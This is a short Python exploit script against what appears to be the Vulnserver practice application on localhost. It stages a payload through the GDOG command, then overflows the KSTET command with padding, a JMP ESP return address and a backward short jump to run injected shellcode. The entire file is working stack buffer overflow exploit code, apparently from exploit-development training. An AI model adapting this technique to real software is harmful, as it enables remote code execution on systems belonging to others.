import socket
from struct import pack

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 9999))
print(sock.recv(1000))

sock.send("GDOG MYSCESCE" + open("calc", "rb").read())

buf = "KSTET ."
buf += open("code", "rb").read()
buf += "A" * (0x4C - len(buf))
buf += pack("<I", 0x625011AF) # JMP ESP
buf += "\xEB" # JUMP BACK
buf += pack("<I", 0xffffffff - (len(buf) + 1 - 7) + 1)
sock.send(buf)

sock.close()

